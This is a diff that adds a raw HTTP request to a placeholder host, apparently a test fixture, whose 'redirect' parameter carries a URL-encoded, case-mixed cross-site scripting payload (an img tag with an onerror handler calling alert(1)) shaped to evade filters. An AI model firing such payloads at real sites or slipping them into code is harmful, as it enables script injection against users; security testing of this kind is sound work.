@@ -1,0 +1,4 @@
+GET /a?redirect=<iMg%20SrC%3D`%20oNeRrOr%3DAlErT(1)> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
